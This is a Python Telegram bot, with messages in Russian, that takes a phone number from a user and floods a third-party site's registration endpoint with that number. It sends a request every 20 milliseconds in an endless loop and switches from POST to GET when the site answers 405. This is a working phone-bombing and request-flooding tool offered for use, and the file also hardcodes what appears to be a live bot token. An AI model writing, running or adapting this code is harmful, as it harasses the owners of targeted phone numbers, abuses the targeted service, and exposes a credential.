import asyncio
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

BASE_URL = "https://cabinet.presscode.app/api/register"

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер (например, +380963836766) — начну долбить сайт запросами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return
    await update.message.reply_text(f"Запущено на {phone}")

    async def spam():
        count = 0
        method = 'POST'
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    if method == 'POST':
                        resp = await session.post(BASE_URL, data={'phone': phone}, timeout=5)
                    else:
                        resp = await session.get(BASE_URL, params={'phone': phone}, timeout=5)
                    status = resp.status
                    text = await resp.text()
                    count += 1
                    if status == 405 and method == 'POST':
                        method = 'GET'
                        await context.bot.send_message(chat_id, f"405, переключаю на GET")
                    else:
                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:30]}")
                    await asyncio.sleep(0.02)
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
                    await asyncio.sleep(0.02)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
